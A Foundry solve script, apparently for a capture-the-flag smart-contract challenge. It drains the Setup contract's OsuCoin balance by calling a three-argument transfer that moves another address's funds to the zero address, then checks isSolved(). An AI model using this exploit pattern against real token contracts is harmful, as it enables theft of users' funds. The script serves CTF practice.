// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "../src/Setup.sol";
import {Script, console} from "forge-std/Script.sol";

contract SolveScript is Script {
    // function setUp() public {
    //     console.log("setUp()");
    // }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address setup_addr = vm.envAddress("SETUP_ADDR");
        Setup s = Setup(setup_addr);
        OsuCoin coin = OsuCoin(s.coin());
        console.log("Coin address: %s", address(coin));
        uint128 setup_bal = coin.balanceOf(setup_addr);
        console.log("Contract balance: %d", coin.balanceOf(setup_addr));
        coin.transfer(setup_addr, address(0), setup_bal);
        console.log("Contract balance: %d", coin.balanceOf(setup_addr));
        assert(s.isSolved() == true);
        vm.stopBroadcast();
    }
}

